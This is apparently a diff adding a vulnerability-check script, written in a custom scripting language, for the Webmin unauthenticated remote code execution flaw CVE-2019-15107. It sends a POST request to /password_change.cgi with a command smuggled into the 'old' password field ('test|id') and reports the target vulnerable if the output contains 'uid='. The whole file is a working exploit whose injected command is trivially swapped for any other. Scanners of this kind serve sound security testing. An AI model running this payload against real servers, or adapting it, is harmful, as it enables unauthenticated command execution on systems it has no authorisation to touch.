@@ -1,0 +1,15 @@
+#request url = var
+#define payload =/password_change.cgi
+#define bug = uid=
+#define info = 存在Webmin Unauthenticated Remote Code Execution (CVE-2019-15107)
+#define post = user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
+
+function main(args)
+{
+	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	print(res[0]);
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
